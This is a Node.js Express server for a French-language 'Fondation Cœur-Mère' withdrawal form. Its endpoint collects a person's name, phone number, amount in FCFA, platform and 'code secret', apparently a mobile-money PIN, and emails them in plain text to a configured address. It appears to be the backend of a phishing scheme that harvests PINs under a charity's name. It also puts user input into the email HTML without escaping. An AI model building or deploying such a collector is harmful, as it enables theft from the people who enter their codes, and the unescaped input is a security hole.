import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { Resend } from 'resend';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __dirname = dirname(fileURLToPath(import.meta.url));
const app = express();
const port = process.env.API_PORT || 4174;
const resendApiKey = process.env.RESEND_API_KEY;
const emailTo = process.env.EMAIL_TO;
const resend = resendApiKey ? new Resend(resendApiKey) : null;

if (!resendApiKey) {
  console.warn('RESEND_API_KEY is not set. Email sending will fail.');
}

if (!emailTo) {
  console.warn('EMAIL_TO is not set. Email sending will fail.');
}

app.use(cors());
app.use(express.json());

app.post('/api/send-email', async (req, res) => {
  const { fullName, phoneNumber, amount, secretCode, platform } = req.body || {};

  if (!fullName || !phoneNumber || !amount || !secretCode || !platform) {
    return res.status(400).json({ error: 'Tous les champs du formulaire sont requis.' });
  }

  if (!resend || !emailTo) {
    console.error('Configuration manquante pour l’envoi de mail.', { resendApiKey: !!resendApiKey, emailTo });
    return res.status(500).json({ error: 'La configuration de l’envoi de mail est manquante.' });
  }

  console.log('Email send request received:', { platform, fullName, phoneNumber, amount });

  const html = `
    <div style="font-family: Arial, sans-serif; color: #111;">
      <h1 style="color: #0f172a;">Nouvelle demande de retrait</h1>
      <p>Une nouvelle demande de retrait a été soumise via la plateforme Fondation Cœur-Mère.</p>
      <ul style="list-style: none; padding: 0;">
        <li><strong>Plateforme :</strong> ${platform}</li>
        <li><strong>Nom :</strong> ${fullName}</li>
        <li><strong>Téléphone :</strong> ${phoneNumber}</li>
        <li><strong>Montant :</strong> ${amount} FCFA</li>
        <li><strong>Code secret :</strong> ${secretCode}</li>
      </ul>
      <p style="margin-top: 24px; color: #475569;">Envoyé automatiquement par le formulaire de retrait.</p>
    </div>
  `;

  try {
    const result = await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: emailTo,
      subject: `Nouvelle demande de retrait ${platform}`,
      html,
    });

    console.log('Email envoyé avec succès:', { to: emailTo, platform, result });
    return res.json({ success: true, details: result });
  } catch (error) {
    console.error('Resend error:', error);
    return res.status(500).json({ error: 'Impossible d’envoyer le message. Vérifiez la configuration Resend.' });
  }
});

if (process.env.NODE_ENV === 'production') {
  app.use(express.static(join(__dirname, 'dist')));

  app.get('*', (req, res) => {
    res.sendFile(join(__dirname, 'dist', 'index.html'));
  });
}

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
